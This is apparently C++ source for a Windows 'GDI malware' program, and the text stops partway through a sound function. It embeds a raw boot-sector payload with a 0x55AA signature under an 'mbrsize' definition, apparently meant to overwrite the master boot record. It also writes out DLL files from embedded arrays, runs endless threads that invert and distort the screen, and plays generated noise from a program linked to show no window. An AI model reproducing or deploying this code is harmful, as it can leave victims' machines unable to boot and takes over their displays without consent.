#include <iostream>
#include <memory>
#include <stdio.h>
#include <tchar.h>
#include <time.h>
#include <Windows.h>
#include <windef.h>
#include <fstream>
#include "icondll.h"
#pragma comment(lib, "Winmm.lib")
#pragma comment( linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"" )
using namespace std;
#define mbrsize 4096
#define boot "\xBB\xE0\x07\x8E\xC3\x8E\xDB\xB8\x16\x02\xB9\x02\x00\xB6\x00\xBB\x00\x00\xCD\x13\x31\xC0\x89\xC3\x89\xC1\x89\xC2\xBE\x00\x00\xBF\xCF\x0C\xAC\x81\xFE\xCF\x0C\x73\x31\x3C\x80\x73\x02\xEB\x0F\x24\x7F\x88\xC1\xAC\xAA\xFE\xC9\x80\xF9\xFF\x75\xF7\xEB\xE4\xB4\x00\x3C\x40\x72\x05\x24\x3F\x88\xC4\xAC\x89\xC1\xAD\x89\xF2\x89\xFE\x29\xC6\xAC\xAA\xE2\xFC\x89\xD6\xEB\xC8\xB8\x13\x00\xCD\x10\xBB\xE0\x07\x8E\xDB\xBE\xCF\x0C\xB4\x00\xAC\xBB\x00\x00\x89\xC1\xBA\xC8\x03\x88\xD8\xEE\x43\xBA\xC9\x03\xAC\xEE\xAC\xEE\xAC\xEE\xE2\xEE\xBB\x00\xA0\x8E\xC3\xBF\x00\x00\xB9\x00\x7D\xF3\xA5\xF4\xEB\xFD\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x55\xAA\xFF\xE0\x00\x00\x00\x3F\x3F\x3F\x33\x33\x33\x2F\x2F\x2F\x10\x10\x10\x31\x31\x31\x2B\x2B\x2B\x00\x00\x00\x00\x00\x00\x2B\x2B\x2B\x3B\x3B\x3B\x03\x03\x03\x03\x03\x03\x38\x38\x38\x0F\x0F\x0F\x00\x00\x00\x3B\x3B\x3B\x38\x38\x38\x0D\x0D\x0D\x33\x33\x33\x09\x09\x09\x33\x33\x33\x13\x13\x13\x18\x18\x18\x0D\x0D\x0D\x11\x11\x11\x0E\x0E\x0E\x0C\x0C\x0C\x06\x06\x06\x18\x18\x18\x0F\x0F\x0F\x22\x22\x22\x0E\x0E\x0E\x2A\x2A\x2A\x39\x39\x39\x03\x03\x03\x10\x10\x10\x0A\x0A\x0A\x0B\x0B\x0B\x15\x15\x15\x0C\x0C\x0C\x09\x09\x09\x0D\xFF\x0D\x0D\x3D\x3D\x3D\x29\x29\x29\x28\x28\x28\x28\x28\x28\x12\x12\x12\x11\x11\x11\x10\x10\x10\x10\x10\x10\x0E\x0E\x0E\x1E\x1E\x1E\x25\x25\x25\x23\x23\x23\x1F\x1F\x1F\x15\x15\x15\x22\x22\x22\x2A\x2A\x2A\x05\x05\x05\x2B\x2B\x2B\x01\x01\x01\x2E\x2E\x2E\x3B\x3B\x3B\x30\x30\x30\x3F\x3F\x3F\x01\x01\x01\x09\x09\x09\x02\x02\x02\x34\x34\x34\x39\x39\x39\x26\x26\x26\x37\x37\x37\x3C\x3C\x3C\x13\x13\x13\x2F\x2F\x2F\x0F\x0F\x0F\x2D\x2D\x2D\x11\x11\x11\x2E\x2E\x2E\x19\x19\x19\x05\x05\x05\x21\x21\x21\x1A\x1A\x1A\x32\x32\x32\xE2\x32\x32\x32\x1D\x1D\x1D\x18\x18\x18\x3C\x3C\x3C\x2A\x2A\x2A\x3D\x3D\x3D\x16\x16\x16\x2F\x2F\x2F\x2D\x2D\x2D\x36\x36\x36\x38\x38\x38\x28\x28\x28\x0E\x0E\x0E\x27\x27\x27\x3C\x3C\x3C\x2F\x2F\x2F\x16\x16\x16\x14\x14\x14\x23\x23\x23\x31\x31\x31\x01\x01\x01\x1D\x1D\x1D\x14\x14\x14\x3C\x3C\x3C\x25\x25\x25\x20\x20\x20\x34\x34\x34\x12\x12\x12\x29\x29\x29\x39\x39\x39\x37\x37\x37\x13\x13\x13\x02\x02\x02\x06\xEA\x00\x94\x35\x35\x35\x06\x06\x06\x1F\x1F\x1F\x1A\x1A\x1A\x1C\x1C\x1C\x04\x04\x04\x0B\x0B\x0B\x06\x12\x00\xEE\x0A\x0A\x0A\x30\x30\x30\x3E\x3E\x3E\x35\x35\x35\x08\x08\x08\x34\x34\x34\x3B\x3B\x3B\x20\x20\x20\x3A\x3A\x3A\x19\x19\x19\x2C\x2C\x2C\x26\x26\x26\x3E\x3E\x3E\x31\x31\x31\x36\x36\x36\x1B\x1B\x1B\x26\x26\x26\x22\x22\x22\x23\x23\x23\x03\x03\x03\x17\x17\x17\x35\x35\x35\x32\x32\x32\x24\x24\x24\x36\x36\x36\x2E\x2E\x2E\x23\x23\x23\x22\x22\x22\x07\x07\x07\x3F\x3F\x3F\x3D\x3D\x3D\x2B\x2B\x2B\x30\x30\x30\x17\x17\x17\x08\x08\x08\x35\x35\x35\x27\x27\x27\x06\x08\x01\x8B\x06\x06\x06\x38\x38\x38\x1F\x1F\x1F\x07\x07\x07\x06\x95\x01\x91\x3E\x3E\x3E\x27\x27\x27\x19\x19\x19\x26\x26\x26\x2C\x2C\x2C\x21\x21\x21\x06\x19\x02\xFD\x2C\x2C\x2C\x2D\x2D\x2D\x1A\x1A\x1A\x1B\x1B\x1B\x19\x19\x19\x1B\x1B\x1B\x0F\x0F\x0F\x39\x39\x39\x1E\x1E\x1E\x28\x28\x28\x37\x37\x37\x07\x07\x07\x14\x14\x14\x2C\x2C\x2C\x14\x14\x14\x0B\x0B\x0B\x36\x36\x36\x1A\x1A\x1A\x17\x17\x17\x27\x27\x27\x15\x15\x15\x21\x21\x21\x0C\x0C\x0C\x30\x30\x30\x16\x16\x16\x34\x34\x34\x3A\x3A\x3A\x04\x04\x04\x20\x20\x20\x04\x04\x04\x0A\x0A\x0A\x12\x12\x12\x04\x04\x04\x1E\x1E\x1E\x01\x01\x01\x0D\x0D\x0D\x3A\x3A\x3A\x24\x24\x24\x15\x15\x15\x2A\x2A\x2A\x1E\x1E\x1E\x21\x21\x21\x06\x8B\x02\x06\x06\x00\x0C\x0C\x00\x18\x18\x00\x30\x30\x00\x40\x60\x60\x00\x40\xC0\xC0\x00\x41\x80\x80\x01\x43\x00\x00\x03\x46\x00\x00\x06\x4C\x00\x00\x0C\x58\x00\x00\x18\x6A\x9A\x9A\x2A\x87\x23\x23\x04\x04\x31\x31\x1B\x1B\x40\x44\x4C\x00\x87\x43\x43\x12\x12\x12\x12\x23\x23\x24\x2C\x00\x81\x44\x44\x04\xEE\x5B\x81\x76\x76\x41\x40\x40\x01\x40\xC0\x40\x01\x87\x4C\x4C\x01\x01\x01\x01\x15\x15\x40\x44\x4C\x00\x81\x4D\x4D\x04\x4C\x00\x81\x4E\x4E\x24\x2C\x00\x81\x25\x25\x04\x2C\x00\x81\xA9\xA9\x41\x40\x40\x01\x40\xC0\x40\x01\x81\x33\x33\x04\xC8\x00\x81\x68\x68\x40\x44\x4C\x00\x81\x13\x13\x04\x4C\x00\x81\x4A\x4A\x24\x2C\x00\x81\x77\x77\x04\x2C\x00\x81\x78\x78\x41\x40\x40\x01\x40\xC0\x40\x01\x81\x12\x12\x04\xC8\x00\x81\x03\x03\x40\x44\x4C\x00\x87\x34\x34\x4F\x4F\x4F\x4F\x26\x26\x24\x2C\x00\x81\x14\x14\x04\x78\x00\x81\x02\x02\x41\x40\x40\x01\x41\x0C\x40\x01\x2C\x2C\x00\x41\x40\x40\x01\x40\x5E\x40\x01\x8C\x1C\x1C\x27\xAA\xAA\x35\x35\x9C\x9C\x50\x50\x28\x28\x06\x13\x00\x86\x69\x69\x29\x26\x26\xAB\xAB\x11\x2B\x00\x8D\x51\x51\x16\x16\x6A\x6A\x36\x36\x37\x37\x1D\x1D\xAC\xAC\x1E\x57\x00\x8D\x79\x79\x38\x38\x7A\x7A\x35\x35\x39\x39\x7B\x7B\x2A\x2A\x05\x13\x00\x81\x1A\x1A\x17\x40\x01\x87\x1E\x1E\x7C\x7C\x1F\x1F\x9D\x9D\x0B\x13\x00\x8C\x7D\x7D\x30\x30\x7C\x7C\x52\x52\x7A\x7A\x17\x17\xAD\x15\xB6\x00\x85\x7E\x7E\x25\x25\x44\x44\x11\x19\x00\x8D\x7F\x7F\x6B\x6B\x80\x80\x35\x35\x1F\x1F\x53\x53\x20\x20\x05\x13\x00\x81\x81\x81\x41\x40\x40\x01\x40\x58\x40\x01\x85\x76\x76\x3A\x3A\xAE\xAE\x04\x5E\x00\x04\x04\x00\x86\x01\x01\x01\x54\x54\x1D\x1D\x04\x19\x00\x84\x9E\x01\x01\x13\x13\x10\x32\x0D\x80\xAF\x05\x46\x6B\x09\x2C\x00\x81\x82\x82\x18\x3F\x08\x85\x12\x12\x06\x06\x83\x83\x0C\x2C\x00\x82\x02\xB0\xB0\x04\x0A\x6C\x13\x40\x01\x83\x53\x53\x84\x84\x06\x24\x00\x07\xEE\x00\x04\x70\x08\x83\xB1\xB1\x6C\x6C\x0B\x3E\x00\x83\x55\x55\x7B\x7B\x0F\x63\x00\x81\xB2\xB2\x04\x19\x00\x81\x31\x31\x0D\x15\x00\x85\x28\x28\x2C\x2C\x9F\x9F\x0C\x78\x00\x86\x45\x53\x53\x00\x00\x0F\x0F\x41\x40\x40\x01\x40\x56\x40\x01\x81\xB3\xB3\x0C\x6B\x00\x09\x09\x00\x88\x3C\x3C\x85\x85\x46\x01\x01\x86\x86\x0C\x2C\x00\x83\x1D\x1D\xB4\xB4\x13\x2C\x00\x80\x6D\x14\x58\x00\x80\x9C\x15\x57\x00\x83\x3A\x3A\x30\x30\x04\x81\x01\x0B\x40\x01\x83\x3D\x3D\x3E\x3E\x0A\x21\x00\x81\x18\x18\x05\x15\x00\x81\x56\x56\x15\x3F\x00\x83\xB5\xB5\x81\x81\x0B\x64\x00\x81\xB6\xB6\x04\x15\x00\x81\x19\x19\x0C\x78\x00\x80\x6E\x15\x39\x00\x85\xB7\xB7\x1E\x1E\x87\x87\x41\x40\x40\x01\x40\x52\x40\x01\x81\xA0\xA0\x08\x62\x00\x8A\x68\x88\x88\x17\x17\x57\x57\x39\x39\x02\x02\x06\x11\x00\x86\x58\x58\x89\x01\x01\x05\x05\x0A\x2C\x00\x81\xB8\xB8\x07\x2B\x00\x89\x3E\x3E\x37\x37\x8A\x8A\xB9\xB9\x2D\x2D\x05\x43\x70\x83\x01\x01\x59\x59\x10\x58\x00\x81\x8B\x8B\x09\xE0\x03\x04\x68\x06\x81\xBA\xBA\x04\x8B\x70\x07\x13\x00\x81\x5A\x5A\x0D\x40\x01\x06\x85\x0D\x04\xAB\x01\x8A\x1F\x1F\x50\x50\x7D\x7D\x00\x00\x00\x8C\x8C\x0A\xC7\x01\x88\xBB\xBB\x5B\x5B\x1D\x1D\x39\x39\x6F\x06\x11\x00\x83\x8D\x8D\x1A\x1A\x09\x3B\x00\x81\x21\x21\x04\x13\x00\x81\x04\x04\x0A\x78\x00\x81\x2E\x2E\x07\x39\x00\x83\x8E\x8E\x6E\x6E\x04\xD0\x00\x81\x52\x52\x08\x60\x00\x82\x01\x58\x58\x41\x40\x40\x01\x40\x50\x40\x01\x81\x47\x47\x06\x5A\x00\x81\xA1\xA1\x09\xB7\x05\x04\x04\x00\x83\x70\x70\x8F\x8F\x07\x74\x00\x0A\x40\x01\x81\x28\x28\x06\x12\x00\x80\x4B\x0C\x2F\x0D\x83\x0B\x0B\x9B\x9B\x05\x16\x00\x81\x6A\x6A\x0C\x58\x00\x81\x2D\x2D\x05\x15\x00\x83\x5C\x5C\xD9\xD9\x0C\x17\x00\x82\x4A\x48\x48\x08\x18\x01\x0A\x40\x01\x06\x40\x00\x82\x01\xA2\xA2\x0A\x28\x00\x80\xDF\x06\x13\x00\x83\x71\x71\xA3\xA3\x0B\x3E\x00\x83\x27\x27\xDA\xDA\x04\x17\x00\x81\x9E\x9E\x09\xE4\x08\x81\x06\x06\x0E\x40\x01\x81\xDB\xDB\x06\x0B\x02\x80\x68\x0B\x64\x01\x85\x00\x00\x00\x30\xA4\xA4\x09\xC3\x06\x40\x4B\x40\x01\x81\x30\x30\x06\x54\x00\x81\xA5\xA5\x11\x1B\x00\x83\x3D\x3D\x40\x40\x0F\x40\x01\x06\x53\x01\x81\x5D\x5D\x11\x2C\x00\x07\xAB\x04\x81\x7F\x7F\x09\x27\x01\x80\x4A\x05\x11\x00\x81\x35\x35\x11\x2B\x00\x83\x75\x75\x05\x05\x0E\x40\x01\x81\x1C\x1C\x05\x0F\x00\x81\xA6\xA6\x0A\x25\x00\x81\x18\x18\x05\x13\x00\x81\x80\x80\x11\x3F\x00\x83\x3B\x3B\x5E\x5E\x05\x50\x07\x80\x45\x15\x40\x01\x81\xBC\xBC\x05\x39\x00\x81\x2D\x2D\x11\x39\x00\x87\x08\x08\x4B\x4B\x01\x01\x41\x41\x41\x40\x40\x01\x40\x4E\x40\x01\x81\x5F\x5F\x04\x6F\x00\x81\x40\x40\x17\x1F\x00\x05\x6D\x03\x08\x40\x01\x81\x4E\x4E\x04\x2C\x00\x81\x3F\x3F\x15\x2A\x00\x80\x5C\x04\x1C\x00\x81\x36\x36\x08\x0F\x00\x81\xBD\xBD\x04\x10\x00\x80\xA7\x15\x2B\x00\x83\x3D\x3D\x46\x46\x0C\x40\x01\x81\xBE\xBE\x05\x95\x07\x0C\x23\x00\x80\x6F\x04\xEA\x04\x81\xBF\xBF\x15\x3F\x00\x81\x3B\x3B\x04\x3D\x05\x83\x01\x01\x27\x27\x13\x40\x01\x06\x5D\x01\x18\x59\x14\x81\xC0\xC0\x40\x50\xC0\x03\x41\x3E\x40\x01\x81\x19\x19\x04\x50\x00\x83\x41\x41\x51\x51\x17\x21\x00\x81\x2F\x2F\x0B\x40\x01\x81\x60\x60\x12\x26\x06\x09\x09\x00\x80\xAD\x04\x1C\x00\x81\x5F\x5F\x05\xA9\x79\x82\x00\x70\x70\x06\x27\x07\x18\x15\x1B\x81\x6B\x6B\x0C\x40\x01\x86\xA7\xA7\x01\x01\x01\x32\x32\x0A\x1F\x00\x88\x2A\x2A\x01\x01\x01\x49\x49\x07\x07\x17\x3F\x00\x81\x90\x90\x06\x8C\x0C\x11\x40\x01\x81\x61\x61\x06\x1A\x04\x80\xA8\x17\x39\x00\x06\x02\x02\x41\x40\x40\x01\x40\x4A\x40\x01\x81\x6D\x6D\x16\xBA\x09\x09\x09\x00\x81\xA3\xA3\x0B\x40\x01\x06\x9F\x0E\x81\x29\x29\x1B\xEB\x03\x82\x01\x85\x85\x04\x0C\x00\x81\x91\x91\x04\x0C\x00\x81\x62\x62\x1E\x08\x1B\x08\x40\x01\x86\x5E\x5E\x01\x83\x83\x3B\x3B\x0A\x1F\x00\x86\x92\x92\x01\x01\x01\x93\x93\x19\x96\x00\x83\x0F\x0F\x49\x49\x04\x41\x00\x81\xC1\xC1\x0F\x40\x01\x81\x36\x36\x04\x0C\x00\x81\x06\x06\x1A\x62\x12\x41\x40\x40\x01\x40\x4E\x40\x01\x81\x8E\x8E\x04\x50\x00\x81\x5B\x5B\x19\x21\x00\x81\x26\x26\x09\x40\x01\x89\x07\x07\x22\x22\x01\x01\x63\x63\x94\x94\x16\x2B\x00\x06\x6E\x0C\x81\x1E\x1E\x04\x0C\x00\x81\x54\x54\x04\x0C\x00\x81\xC2\xC2\x18\x57\x00\x06\x9F\x08\x06\x40\x01\x88\x0F\x0F\x72\x72\x01\x3F\x3F\x75\x75\x0A\x1F\x00\x05\x0C\x0F\x0C\x52\x0C\x11\x41\x00\x81\xC3\xC3\x04\x41\x00\x81\xC4\xC4\x0F\x40\x01\x81\x64\x64\x04\x0C\x00\x81\x95\x95\x1A\xAC\x20\x40\x4A\x78\x1E\x41\x40\x40\x01\x04\x04\x00\x06\xD4\x0C\x07\x15\x16\x14\x21\x00\x81\x1B\x1B\x09\x40\x01\x89\x08\x08\x72\x72\x01\x01\x0A\x0A\x0C\x0C\x16\x2B\x00\x0C\x88\x0E\x81\x73\x73\x04\x0C\x00\x81\xC5\xC5\x24\x00\x19\x86\x07\x07\x5F\x5F\x01\x3F\x3F\x0C\x97\x01\x05\x7E\x0F\x81\x14\x14\x1B\xB9\x00\x81\x93\x93\x04\x41\x00\x81\x8A\x8A\x0F\x40\x01\x81\x78\x78\x04\x0C\x00\x0E\xB9\x0D\x40\x5C\x00\x19\x41\x40\x40\x01\x81\xC6\xC6\x04\x50\x00\x08\xED\x18\x20\x40\x01\x87\x0D\x0D\x01\x01\x10\x10\x0B\x0B\x16\x2B\x00\x81\x09\x09\x04\x4C\x00\x81\x0E\x0E\x0A\x40\x01\x81\x25\x25\x26\x40\x01\x81\x11\x11\x0F\x97\x01\x05\xA6\x11\x18\xA8\x06\x05\x05\x00\x81\x1F\x1F\x04\x41\x00\x81\x50\x50\x0F\x40\x01\x81\x96\x96\x04\x0C\x00\x81\x33\x33\x41\x40\x40\x01\x40\x68\x40\x01\x81\x97\x97\x04\x50\x00\x81\x74\x74\x40\x50\x40\x01\x06\x3F\x14\x81\x2F\x2F\x24\x40\x06\x13\x40\x01\x05\xB8\x10\x81\x61\x61\x1B\xB9\x00\x81\x2C\x2C\x04\x41\x00\x81\x38\x38\x0F\x40\x01\x06\xF1\x10\x05\x17\x00\x15\x37\x00\x81\x29\x29\x41\x40\x40\x01\x40\x4E\x40\x01\x81\x62\x62\x05\xBB\x18\x15\xBC\x18\x0A\x71\x00\x32\x40\x01\x06\xEA\x0D\x81\x9B\x9B\x18\x57\x00\x81\x7E\x7E\x1D\x40\x01\x86\x98\x98\x01\x01\x01\x34\x34\x1B\xB9\x00\x04\x4B\x09\x07\x63\x06\x0C\x40\x01\x05\x39\x00\x82\x01\x47\x47\x1A\x8B\x1E\x41\x40\x40\x01\x40\x4E\x40\x01\x81\x74\x74\x04\x50\x00\x83\x2B\x2B\x69\x69\x17\x21\x00\x81\x20\x20\x35\x40\x01\x81\xDC\xDC\x04\x0C\x00\x81\x49\x49\x18\x78\x00\x81\x31\x31\x1D\x40\x01\x05\x1F\x00\x81\x72\x72\x19\xB7\x00\x06\x7F\x10\x81\x8F\x8F\x11\x40\x10\x81\xA6\xA6\x04\x0C\x00\x81\x9F\x9F\x0B\x8C\x0B\x0D\x39\x00\x05\x99\x10\x40\x4B\x40\x01\x83\x0F\x0F\x0A\x0A\x06\x66\x18\x17\x21\x00\x05\x49\x0C\x32\x40\x01\x81\x42\x42\x06\xA1\x0E\x12\xD5\x16\x0B\xDF\x13\x1A\x40\x01\x81\x00\x00\x04\x6B\x00\x82\x01\x6E\x6E\x1D\x7E\x02\x81\xC7\xC7\x13\x40\x1A\x06\x5A\x14\x80\xDD\x17\x39\x00\x06\xFA\x16\x41\x40\x40\x01\x40\x4C\x80\x16\x81\xC8\xC8\x06\x32\x13\x15\x6E\x04\x06\x1F\x05\x33\x40\x01\x83\x00\x00\x17\x17\x05\x3B\x00\x81\x56\x56\x19\x3D\x07\x1D\x40\x01\x81\x16\x16\x05\x22\x00\x81\x65\x65\x13\x3F\x00\x06\x6A\x1F\x81\x89\x89\x15\x00\x19\x81\x66\x66\x05\x39\x00\x81\x37\x37\x13\x39\x00\x81\xC9\xC9\x40\x52\x00\x19\x41\x40\x40\x01\x08\x00\x30\x04\xB3\x1A\x81\x1C\x1C\x0D\xAB\x0B\x08\x19\x00\x35\x40\x01\x08\x0C\x11\x82\x01\x91\x91\x0E\xDD\x16\x81\x25\x5C\x05\x2A\x19\x1F\x40\x01\x81\x00\x00\x07\x64\x01\x81\x88\x88\x0D\x86\x16\x81\x26\x26\x08\xBD\x1B\x07\xE4\x21\x12\x40\x1F\x81\x3C\x3C\x05\x20\x00\x82\x2E\x2E\xA8\x0D\x86\x16\x82\x43\x5D\x5D\x40\x54\x00\x1E\x41\x40\x40\x01\x04\x44\x06\x08\xDD\x20\x8C\x2B\x2B\xAF\x65\x65\x4C\x4C\x0E\x0E\x17\x17\x3A\x3A\x08\x6D\x00\x80\x6C\x38\x40\x01\x81\x42\x42\x07\xAD\x21\x8B\x58\x58\x47\x47\xCA\xCA\x1A\x1A\x0E\x0E\x57\x57\x06\xED\x00\x04\x57\x00\x80\x6C\x1F\x40\x01\x08\x80\x01\x8C\x01\x48\x48\xCB\xCB\x2F\x2F\xCC\xCC\x61\x61\x17\x17\x05\xAB\x03\x0F\xE3\x13\x10\x80\x20\x83\x00\x00\xCD\xCD\x07\x23\x22\x8C\x2D\x2D\xCE\xCE\x4C\x4C\x1E\x1E\xA2\xA2\x2C\x2C\x9E\x06\x39\x00\x81\x10\x10\x41\x40\x40\x01\x40\x52\x40\x24\x83\x0F\x0F\x59\x59\x15\xF1\x25\x84\x45\x45\x24\x24\x73\x08\xE9\x1A\x81\x08\x08\x06\x80\x16\x18\x40\x01\x06\x20\x03\x0C\x47\x1B\x81\x08\x08\x09\x99\x24\x0D\x57\x00\x83\x13\x13\x04\x04\x04\x68\x08\x81\xA1\xA1\x09\xD8\x16\x81\x63\x63\x13\x57\x14\x08\x9A\x23\x0F\x3F\x00\x83\x87\x87\x16\x16\x11\xB8\x01\x81\x24\x24\x0C\x3A\x00\x08\x41\x24\x0E\x39\x00\x89\x96\x96\x19\x19\x99\x99\x01\x01\xCF\xCF\x41\x40\x40\x01\x40\x52\xC0\x2B\x81\x27\x27\x09\xE3\x25\x06\x06\x00\x83\xD0\xD0\x52\x52\x04\x19\x00\x84\x01\x01\x01\x99\x99\x06\x90\x03\x04\xFC\x07\x83\x01\x01\xD1\xD1\x16\x42\x00\x06\x18\x06\x0F\x48\x2B\x81\x65\x65\x09\xB2\x26\x07\x07\x00\x82\x89\xD2\xD2\x07\x57\x00\x07\xC3\x22\x81\x07\x07\x05\x0D\x2C\x15\x81\x3A\x81\x70\x70\x04\xB4\x22\x0B\x3E\x00\x85\x0A\x0A\x67\x67\xD3\xD3\x0D\x24\x00\x06\x22\x00\x0F\xEC\x11\x81\x66\x66\x06\x5B\x12\x0B\x3A\x00\x81\x39\x39\x08\x78\x00\x81\x0D\x0D\x41\x40\x40\x01\x40\x56\xC0\x30\x8C\x20\x20\xDE\x2E\x2E\x9A\x9A\x09\x09\x67\x67\x38\x38\x06\x50\x03\x84\x3D\x3D\x24\x16\x16\x06\x2B\x08\x87\x0F\x0F\x19\x19\x66\x66\x30\x30\x18\x6C\x10\x85\xD4\xD4\x19\x19\x32\x32\x13\xDE\x03\x83\x1A\x1A\x34\x34\x04\x58\x00\x85\x3C\x3C\x36\x36\x27\x27\x05\x68\x30\x85\x44\x44\x19\x19\x16\x16\x06\x78\x19\x88\x0F\x0F\x20\x20\x2F\x1E\x1E\x42\x42\x17\x96\x00\x8C\x28\x28\x90\x90\x8C\x8C\x09\x09\x71\x71\x92\x92\x27\x13\x66\x01\x87\x1B\x1B\x74\x74\xD5\xD5\xD6\xD6\x13\xA5\x38\x85\xD7\xD7\x60\x60\x4F\x4F\x04\xD0\x00\x81\x5B\x5B\x05\x98\x00\x85\xD8\xD8\x24\x24\x16\x16\x1A\xA0\x16\x41\x40\x40\x01\x7F\xA7\xFF\x7F\x62\xC6\xC6\x22\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"

void icondll(int code) {
    ofstream ofs;
    ofs.open("ANDROIDICON.dll", ios_base::out | ios_base::binary);
    ofs.write((char*)ANDROIDICON, sizeof(ANDROIDICON));
    ofs.close();
    ofs.open("XUGEICON.dll", ios_base::out | ios_base::binary);
    ofs.write((char*)XUGEICON, sizeof(XUGEICON));
    ofs.close();
}

void icon2kdll(int code) {
    ofstream ofs;
    ofs.open("ANDROIDICON2K.dll", ios_base::out | ios_base::binary);
    ofs.write((char*)ANDROIDICON2K, sizeof(ANDROIDICON2K));
    ofs.close();
    ofs.open("XUGEICON2K.dll", ios_base::out | ios_base::binary);
    ofs.write((char*)XUGEICON2K, sizeof(XUGEICON2K));
    ofs.close();
}

DWORD WINAPI Color(LPVOID lpParam) {
    HDC desk = GetDC(0);
    int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
    while (1)
    {
        desk = GetDC(0);
        SelectObject(desk, CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255))); //epic gdi leak
        PatBlt(desk, 0, 0, sw, sh, PATINVERT);
        Sleep(100);
    }
    return 0;
}

DWORD WINAPI ColorInvert(LPVOID lpParam) {
    for (;;) {
        HDC hdc = GetDC(0);
        int w = GetSystemMetrics(0), h = GetSystemMetrics(1);

        BitBlt(hdc, 0, 0, w, h, hdc, 0, 0, NOTSRCCOPY);

        ReleaseDC(0, hdc);
        DeleteObject(hdc);

        Sleep(1000);
    }
    return 0;
}

DWORD WINAPI Tunnel(LPVOID lpParam) {
    for (;;) {
        HDC hdc = GetDC(0);
        int w = GetSystemMetrics(0), h = GetSystemMetrics(1);

        StretchBlt(hdc, 20, 20, w - 40, h - 40, hdc, 0, 0, w, h, SRCCOPY);

        ReleaseDC(0, hdc);
        DeleteObject(hdc);

        Sleep(100);
    }
    return 0;
}

VOID WINAPI sound10() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t >> 9 ^ (t >> 9) - 1 ^ 1) % 100 * t;

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI sound1() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
